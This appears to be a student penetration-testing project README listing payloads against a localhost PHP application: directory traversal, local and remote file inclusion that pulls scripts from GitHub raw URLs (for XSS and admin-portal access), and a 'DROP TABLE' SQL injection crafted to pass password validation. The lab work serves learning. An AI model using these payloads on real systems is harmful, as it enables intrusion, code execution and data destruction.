# Penetration Testing Main Project
I will host all payloads useed to execute penetration testing tests against the localhost web application.

## Auth2.php

Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```

File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```

XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```

Accessing unsecured Admin Portal (File Inclusion / Directory Traversal):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## Register.php
This is the signup page - ```http://localhost/Project23/register.php```

### SQL Injection
This query includes the commented noise ```--AbC1xyz```, which meets the specified criteria of being at least 8 characters long, containing a mix of uppercase and lowercase letters, and including a digit for the password sanitation. The commented noise itself will not affect the execution of the SQL query but adds some complexity to the string. I do not want the noise to affect the SQL query should ultimately achieves SQL Injection. Here's a breakdown of the query: <br/>

```
'; DROP TABLE loginevents; --AbC1xyz'
```

1. ```';``` This part closes the original SQL statement (if any) and starts a new one. <br/>
2. ```DROP TABLE loginevents;``` This is a SQL command that deletes the specified table (```loginevents``` in this case) from the database. <br/>
3. ```--``` This is a SQL comment that comments out the rest of the original query. It helps to avoid syntax errors that might occur due to the injection.
